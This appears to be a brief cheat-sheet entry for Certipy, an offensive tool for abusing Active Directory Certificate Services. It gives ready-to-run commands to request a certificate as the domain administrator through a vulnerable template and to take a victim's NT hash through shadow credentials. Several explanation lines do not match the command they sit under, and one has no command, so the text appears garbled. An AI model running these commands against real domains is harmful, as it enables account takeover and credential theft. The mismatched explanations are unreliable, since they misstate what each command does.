name: Certipy
description: A tool for enumerating and abusing Active Directory Certificate Services (AD CS) — vulnerable templates, certificate theft and shadow credentials.

commands.explanation: Enumerates AD Certificate Services and flags vulnerable templates (ESC1–ESC16).
Prints only the vulnerable templates to the terminal.

commands.example: certipy req -u svc@corp.local -p pass -ca CORP-CA -target ca.corp.local -template VulnTemplate -upn administrator@corp.local
commands.explanation: Requests a certificate as another user through a misconfigured template.
Authenticates with the issued certificate and returns a TGT and the NT hash.

commands.example: certipy shadow auto -u svc@corp.local -p pass -account victim
commands.explanation: Adds a Key Credential to a target account and retrieves its NT hash (needs write rights).
Inspects the certificate authority and its templates.
